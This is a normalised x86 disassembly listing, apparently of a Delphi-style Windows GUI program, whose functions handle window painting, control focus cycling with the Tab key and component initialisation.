jbe r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4a52d2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
mov ecx eax
mov edx eax
lea eax [ ebp - 0x1c ]
call sub_432b28
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
neg eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1b0 ]
neg edx
push eax
mov eax [ ebp - 0xc ]
push eax
call SetWindowOrgEx
lea ecx [ ebp - 0x28 ]
mov dl 0x2b
mov eax ebx
call sub_44c7d4
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
mov edx eax
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_44c5ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ReleaseDC
retn
sub_4a52f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_44c2c8
mov ebx eax
mov eax ebx
call sub_44c3d4
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_497c74
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_496868
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_44c568
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4a533c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4a3f0c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x2c0 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a5390
push ebx
push esi
push edi
push ebp
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x2c0 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x2c0 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4a3fcc
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
mov eax [ esi + 0x2c0 ]
mov edx edi
call sub_4246e8
xor edx edx
mov [ eax + 0x264 ] edx
inc edi
dec ebp
jne r-xdata
sub_4a53f0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4a5868
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax esi
call sub_4a5850
movzx eax [ eax + 0x26a ]
push eax
mov edx ebx
mov eax esi
call sub_4a5850
pop edx
call sub_4a5140
inc ebx
dec edi
jne r-xdata
sub_4a5444
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4a6158
mov edx eax
mov eax [ ebx + 0x2c0 ]
call sub_4246e8
mov edx [ eax ]
call [ edx + 0x4c ]
pop esi
pop ebx
retn
sub_4a5468
push ebx
mov ebx eax
mov eax ebx
call sub_4a42d8
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
mov eax ebx
call sub_4a4070
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_477028
test eax eax
je r-xdata
cmp [ eax + 0x2a8 ] 0x0
je r-xdata
mov eax [ eax + 0x2a8 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4a54b0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp ebp [ ebx + 0x2c4 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_477028
mov edi eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
mov eax [ ebx + 0x2c4 ]
test eax eax
je r-xdata
mov eax ebp
call sub_48e210
mov dl 0x1
mov eax ebp
call sub_48deb0
test edi edi
je r-xdata
mov edx [ edi + 0x278 ]
mov eax [ ebx + 0x2c4 ]
call sub_492284
test al al
je r-xdata
mov [ ebx + 0x2c4 ] ebp
test edi edi
je r-xdata
xor edx edx
call sub_48deb0
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
mov edx [ ebx + 0x2c4 ]
mov eax edi
call sub_47bed4
mov esi [ ebx + 0x2c4 ]
cmp esi [ edi + 0x278 ]
je r-xdata
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
mov eax [ edi + 0x278 ]
cmp eax [ ebx + 0x2c4 ]
jne r-xdata
mov eax esi
call sub_4a4e48
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe8 ]
jmp r-xdata
mov eax [ edi + 0x278 ]
cmp eax [ ebx + 0x2c4 ]
jne r-xdata
mov eax ebp
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax [ ebx + 0x2c4 ]
call sub_496eb0
mov edx ebx
mov eax edi
call sub_47bed4
mov edx ebp
mov eax edi
call sub_47bed4
jmp r-xdata
sub_4a55b8
push ebx
push esi
push edi
mov edi ecx
mov esi eax
cmp edx [ esi + 0x2c4 ]
sete bl
mov eax esi
call sub_4a4d24
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
test bl bl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4a4d24
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jl r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov eax esi
call sub_4a4d24
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
sub_4a5614
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov edi [ esi + 0x2c8 ]
test edi edi
je r-xdata
pop ebp
pop edi
pop esi
retn
mov edx edi
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_4a5634
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_496868
push eax
call GetWindowRect
push esi
push edi
lea edi [ esi + 0x4c ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffc2
call sub_4483f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4a5688
push ebx
mov ebx eax
cmp [ ebx + 0x2cc ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x8
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4a59b8
mov eax [ ebx + 0x2cc ]
call sub_4481b0
xor eax eax
mov [ ebx + 0x2cc ] eax
sub_4a56bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ esi + 0x2c0 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor eax eax
call sub_424744
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov ebx edi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ esi + 0x2c0 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor edi edi
mov eax [ esi + 0x2c0 ]
mov edi [ eax + 0x8 ]
dec edi
jmp r-xdata
dec ebx
mov eax [ esi + 0x2c0 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x2c0 ]
call sub_4246e8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ eax + 0x268 ] 0x0
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4a5744
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c0 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c0 ]
mov edx esi
call sub_4246e8
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4a5784
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebx eax
cmp [ ebx + 0x2ba ] 0x0
je r-xdata
xor ebp ebp
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x2c0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx [ esp ]
mov eax ebx
call sub_4a42b0
jmp r-xdata
mov edx [ esp ]
add edx [ esp + 0x4 ]
mov eax ebx
call sub_4a5850
mov eax [ eax + 0x260 ]
inc esi
xor edi edi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
inc [ esp + 0x4 ]
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ esp ]
inc eax
cmp ebp eax
je r-xdata
mov edx edi
mov eax ebx
call sub_4a5850
cmp [ eax + 0x268 ] 0x0
jne r-xdata
sub_4a5800
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_4a5868
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp + 0x90 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4a5850
cmp eax [ ebp + 0x30 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4a5850
mov [ esp ] eax
jmp r-xdata
sub_4a5874
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_4a5800
test eax eax
sete [ edi ]
lea eax [ ebp - 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_495114
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4a58b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2c0 ]
call sub_424590
mov [ esi + 0x264 ] ebx
mov eax esi
call sub_4a5060
pop esi
pop ebx
retn
sub_4a58dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a593a
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_48df68
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4a4e48
push eax
mov eax ebx
call sub_4a4d24
pop edx
pop ecx
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5941
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4a5948
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4a4d24
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x78 ]
pop edi
pop esi
pop ebx
retn
sub_4a5968
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
push eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4a56bc
mov edi eax
cmp esi edi
jne r-xdata
xor edx edx
mov eax esi
call sub_4a4fd8
xor eax eax
mov [ esi + 0x264 ] eax
mov edx esi
mov eax [ ebx + 0x2c0 ]
call sub_4248a0
mov edx edi
mov eax ebx
call sub_4a5a04
pop edi
pop esi
pop ebx
retn
xor edi edi
sub_4a59b8
push ebx
push esi
push edi
mov edi eax
push ecx
mov eax edi
mov ecx [ edi + 0x2c4 ]
xchg edx ecx
call sub_4a56bc
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx [ edi + 0x2c4 ]
je r-xdata
mov eax edi
mov si 0xffb0
call sub_4483f8
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_4a5a04
mov eax edi
mov si 0xffaf
call sub_4483f8
sub_4a5a04
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2d0 ] 0x1
xor eax eax
push ebp
push sub_4a5a8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4a54b0
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x264 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x2c4 ]
jne r-xdata
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
jmp r-xdata
pop ebx
pop ecx
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2d0 ] 0x0
retn
mov eax ebx
call sub_4a4e48
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
sub_4a5aa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4964ec
pop esi
pop ebx
retn
cmp ebx [ esi + 0x264 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4a5a04
sub_4a5ad8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a5b2b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_48df68
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4a4e48
push eax
mov eax ebx
call sub_4a4d24
pop edx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x20 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5b32
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4a5b38
push ebx
mov ebx eax
mov eax ebx
call sub_4a42d8
test eax eax
jl r-xdata
xor edx edx
mov eax ebx
call sub_4a5a04
pop ebx
retn
mov eax ebx
call sub_4a42d8
push eax
mov eax ebx
call sub_4a4d24
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax ebx
call sub_4a5a04
pop ebx
retn
sub_4a5b74
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0xc ]
push eax
mov eax ebx
call sub_496868
xor ecx ecx
mov edx 0x130d
call sub_41f0dc
mov esi eax
test esi esi
jl r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4a42d8
cmp esi eax
je r-xdata
mov [ edi + 0xc ] 0x1
sub_4a5bdc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb3
call sub_4483f8
test al al
jne r-xdata
cmp [ edi + 0x4 ] 0x9
jne r-xdata
call GetFocus
push eax
mov eax ebx
call sub_496868
push eax
call IsChild
test eax eax
je r-xdata
mov edx edi
mov eax ebx
call sub_495bf8
push 0x11
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
setge dl
mov cl 0x1
mov eax ebx
call sub_4a59b8
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4a5c48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4a5dd6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4a5868
mov esi eax
dec esi
test esi esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a4d38
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c8 ] ebx
xor eax eax
push ebp
push sub_4a5db9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a5d4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c8 ]
mov edx [ ebp - 0x4 ]
call sub_4a4f10
mov eax [ edi + 0x4 ]
lea ecx [ eax + 0x4c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov si 0xffcc
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_48df68
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_48dfa0
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4a5850
push eax
mov eax [ ebp - 0x4 ]
call sub_4a5868
mov edx eax
dec edx
pop eax
call sub_4a4f44
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx ebx [ eax + 0x57 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c8 ]
mov edx ebx
call sub_4a501c
test bl bl
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4a5850
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5ddd
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
mov dl 0x5
mov eax [ ebp - 0x8 ]
call sub_48d260
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2c8 ] edx
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2c8 ]
mov eax [ ebp - 0x4 ]
call sub_4a5a04
sub_4a5d52
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c8 ]
call sub_4481b0
call sub_448ca8
call sub_448cfc
mov eax [ ebp - 0x8 ]
movzx ebx [ eax + 0x57 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c8 ]
mov edx ebx
call sub_4a501c
test bl bl
je r-xdata
mov dl 0x5
mov eax [ ebp - 0x8 ]
call sub_48d260
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2c8 ] edx
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2c8 ]
mov eax [ ebp - 0x4 ]
call sub_4a5a04
sub_4a5de4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4a5f04
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ edi + 0x4 ]
mov eax esi
call sub_4a5800
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a5f0b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov ebx [ edi + 0x8 ]
mov eax [ ebx ]
sub eax 0xc
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_449ed8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub eax 0xafff
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4a501c
jmp r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_48dfa0
jmp r-xdata
mov [ ebp - 0xc ] eax
mov ebx 0x1
mov edx r-xdata
mov [ ebp - 0x10 ] edx
cmp [ eax + ebx * 2 - 0x2 ] 0x100
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
movzx eax [ eax + ebx * 2 - 0x2 ]
mov edx [ ebp - 0x10 ]
movzx eax al
bt [ edx ] eax
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
test al al
je r-xdata
mov al 0x1
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_449fd0
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_4a5f12
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
xor eax eax
mov [ esi + 0xc ] eax
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4a5800
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x2cc ] eax
mov eax [ esi + 0x8 ]
xor edx edx
call sub_48d260
sub_4a5f60
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor ebp ebp
cmp [ ebx + 0x1e4 ] 0x0
je r-xdata
mov eax ebp
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0x8 ]
push eax
mov eax ebx
call sub_496868
xor ecx ecx
mov edx 0x130d
call sub_41f0dc
test eax eax
jl r-xdata
xor esi esi
mov edi eax
test edi edi
jl r-xdata
test esi esi
je r-xdata
inc edi
mov eax esi
call sub_492534
test eax eax
jle r-xdata
push 0x1
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4a56bc
mov esi eax
dec edi
jne r-xdata
xor edx edx
mov eax esi
call sub_4924f8
mov ebp eax
cmp ebx [ ebp + 0x90 ]
je r-xdata
xor ebp ebp
sub_4a5ff0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48fcfc
mov eax [ esi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4a5f60
test eax eax
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
cmp [ ebx + 0x27d ] 0x0
jne r-xdata
or ecx 0xffffffff
xor edx edx
call sub_48e71c
sub_4a6044
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48fd64
mov eax [ esi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4a5f60
test eax eax
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
xor edx edx
call sub_48ede4
sub_4a6090
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi 0xffffffff
jle r-xdata
xor edx edx
mov eax ebx
call sub_4a5a04
pop esi
pop ebx
retn
mov eax ebx
call sub_4a5868
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_4a5850
mov edx eax
mov eax ebx
call sub_4a5a04
pop esi
pop ebx
retn
sub_4a60c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4a4628
cmp [ ebx + 0x2d0 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov eax [ ebx + 0x2c0 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov edx esi
mov eax ebx
call sub_4a5850
cmp [ eax + 0x268 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4a6158
mov edx eax
mov eax ebx
call sub_4a5850
mov edx eax
mov eax ebx
call sub_4a5a04
sub_4a6120
push ebx
push esi
mov esi edx
mov ebx eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_494888
pop esi
pop ebx
retn
mov eax ebx
call sub_497d00
test al al
jne r-xdata
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4a6158
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp edx
mov ebx edx
test ebx ebx
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_4a5850
cmp [ eax + 0x268 ] 0x0
jne r-xdata
sub_4a6188
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_490f20
mov edx 0x96
mov eax esi
call sub_48d5f8
mov edx 0x2d
mov eax esi
call sub_48d62c
mov dl 0x1
mov eax esi
call sub_496b44
xor eax eax
mov [ esi + 0x274 ] eax
mov [ esi + 0x278 ] 0xa
xor eax eax
mov [ esi + 0x280 ] eax
mov [ esi + 0x264 ] 0x1
mov [ esi + 0x268 ] 0x2
mov [ esi + 0x284 ] 0x0
mov [ esi + 0x27c ] 0x1
xor eax eax
mov [ esi + 0x288 ] eax
xor eax eax
mov [ esi + 0x28c ] eax
mov [ esi + 0x26c ] 0x14
mov [ esi + 0x261 ] 0x0
mov [ esi + 0x262 ] 0x1
mov [ esi + 0x260 ] 0x0
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x270 ] 0x1
mov [ esi + 0x290 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a626c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_4a37c8
mov edx esi
mov eax ebx
call sub_4926c0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4925ec
mov ecx [ ebx + 0x27c ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x278 ]
sub eax [ ebx + 0x274 ]
cmp eax 0x2710
setg al
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x262 ]
mov eax [ eax + edx * 4 ]
mov eax [ ebx + 0x278 ]
sub eax [ ebx + 0x274 ]
cdq
idiv ecx
cmp eax 0x2710
setg al
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x262 ]
mov eax [ eax + edx * 4 ]
jmp r-xdata
cmp [ ebx + 0x290 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
mov edx [ esi + 0x4 ]
movzx ecx [ ebx + 0x260 ]
